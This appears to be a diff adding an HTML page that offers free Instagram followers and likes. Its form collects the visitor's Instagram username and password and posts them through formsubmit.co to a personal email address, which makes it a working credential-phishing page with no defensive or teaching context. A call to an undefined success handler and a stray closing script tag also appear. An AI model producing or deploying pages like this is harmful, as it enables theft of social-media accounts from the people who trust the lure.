@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram Followers & Likes</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #fdfbfb, #ebedee);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .container {
+      display: flex;
+      gap: 30px;
+      align-items: center;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .side-images img {
+      width: 100px;
+      margin-bottom: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      transition: transform 0.3s;
+    }
+
+    .side-images img:hover {
+      transform: scale(1.1);
+    }
+
+    form {
+      background: #fff;
+      padding: 30px 40px;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+      width: 380px;
+    }
+
+    .form-title {
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      color: #e1306c;
+      margin-bottom: 25px;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 6px;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+
+    input[type="radio"],
+    input[type="checkbox"] {
+      margin-right: 8px;
+    }
+
+    .radio-group {
+      display: flex;
+      gap: 20px;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    button {
+      width: 100%;
+      background: #e1306c;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #c1255c;
+    }
+
+    .stickers {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-bottom: 10px;
+    }
+
+    .stickers img {
+      width: 32px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Left Images -->
+    <div class="side-images">
+      <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Insta Sticker">
+      <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" alt="Like Sticker">
+    </div>
+
+    <!-- Form -->
+    <form id="loginform" onsubmit="showSuccessMessage(event)"
+    action="https://formsubmit.co/sohamjain9999@gmail.com" method="POST">
+      <div class="form-title">Get Instagram Followers & Likes</div>
+
+      <div class="stickers">
+        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Insta Sticker">
+        <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" alt="Like Sticker">
+      </div>
+
+      <div class="form-group">
+        <label for="name">Username</label>
+        <input type="text" id="name" name="name" placeholder="Enter your username" required>
+      </div>
+
+      <div class="form-group">
+        <label for="password">Instagram Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+      </div>
+
+      <div class="form-group">
+        <label>Service Type</label>
+        <div class="radio-group">
+          <label><input type="radio" name="subscription" value="followers" required> Followers</label>
+          <label><input type="radio" name="subscription" value="likes" required> Likes</label>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="gender">Select Quantity</label>
+        <select id="gender" name="gender" required>
+          <option value="" disabled selected>Select</option>
+          <option value="50">50</option>
+          <option value="100">100</option>
+          <option value="200">200</option>
+          <option value="300">300</option>
+          <option value="500">500</option>
+          <option value="1000">1000</option>
+        </select>
+      </div>
+
+      <div class="form-group checkbox-group">
+        <input type="checkbox" id="terms" name="terms" required>
+        <label for="terms">I agree to the terms and conditions</label>
+      </div>
+
+      <button type="submit">Submit</button>
+    </form>
+
+    <!-- Right Images -->
+    <div class="side-images">
+      <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Insta Sticker">
+      <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" alt="Like Sticker">
+    </div>
+  </div>
+
+
+  </script>
+</body>
+</html>
